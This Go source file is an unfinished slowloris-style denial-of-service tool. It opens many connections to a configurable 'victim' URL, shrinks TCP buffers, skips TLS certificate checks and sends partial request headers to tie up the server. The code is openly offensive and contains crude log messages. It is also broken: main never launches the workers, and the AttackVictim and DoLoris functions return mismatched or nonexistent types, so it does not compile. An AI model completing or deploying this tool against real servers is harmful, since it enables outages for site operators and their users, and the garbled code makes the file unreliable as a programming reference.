package main

import (
	"crypto/tls"
	"flag"
	"fmt"
	"io"
	"log"
  "net"
	"net/url"
	"runtime"
	"time"
)

var (
	contentLength = flag.Int("contentLength", 1000*1000, "Maximum length of POST body, in bytes.")
	workers       = flag.Int("workers", 128, "The number of workers you want to be trying to make connections with")
	victimUrl     = flag.String("victumUrl", "127.0.0.1", "The URL of the victim you want to test")
	tlsConfig     = tls.Config{InsecureSkipVerify: true}
  rampUpInterval= flag.Duration("rampUpInterval", 10*time.Second, "Sleep interval between sent packets")
)

func main() {
	flag.Parse()
	flag.VisitAll(func(f *flag.Flag) {
		fmt.Printf("%s=%v\n", f.Name, f.Value)
	})

	fmt.Println("is shit working?")

	runtime.GOMAXPROCS(*workers)

	victimUri, err := url.Parse(*victimUrl)
	if err != nil {
		log.Fatalf("Cannot parse victimUrl=[%d]: [%s]\n", victimUrl, err)
	}
}

func DialWorker(
  activeConnectionsCh chan<- int,
  victimHostPort string,
  victimUri *url.URL,
  requestHeader []byte,
) {
  isTls := (victimUri.Scheme == "https")
  for {
    time.Sleep(*rampUpInterval)
    conn := DialVictim(victimHostPort, isTls)
    
    if conn != nil {
      go DoLoris(conn, victimUri, activeConnectionsCh, requestHeader)
    }
  }
}

func DialVictim(hostPort string, isTls bool) io.ReadWriteCloser {
  conn, err := net.Dial("tcp", hostPort)
  if err != nil {
    fmt.Printf("ffs we can't connect to the bitch @ [%v]", hostPort)
    return nil
  }

  tcpConn := conn.(*net.TCPConn)

  if err = tcpConn.SetReadBuffer(128); err != nil {
    log.Fatalf("Can't shrink TCP read buffer [%s]\n", err)
  }

  if err = tcpConn.SetWriteBuffer(128); err != nil {
		log.Fatalf("Cannot shrink TCP write buffer: [%s]\n", err)
	}

	if err = tcpConn.SetLinger(0); err != nil {
		log.Fatalf("Cannot disable TCP lingering: [%s]\n", err)
	}

	if !isTls {
		return tcpConn
	}

	tlsConn := tls.Client(conn, tlsConfig)
	if err = tlsConn.Handshake(); err != nil {
		conn.Close()
		log.Printf("Couldn't establish tls connection to [%s]: [%s]\n", hostPort, err)
		return nil
	}

  return tlsConn
}

func DoLoris(
  conn io.ReadWriteCloser,
  victimUri *url.URL,
  activeConnectionsCh chan<- int,
  requestHeader []byte,
) (
  runtime.Func,
  runtime.Error,
) {

  defer conn.Close()

  if _, err := conn.Write(requestHeader); err != nil {
    log.Printf("Cannot write requestHeader[%v]: %s\n", requestHeader, err)
  }
  return AttackVictim()
}

func AttackVictim() (runtime.Func, runtime.Error) {
  return DialVictim(*victimUrl, false), runtime.StartTrace().Error
}
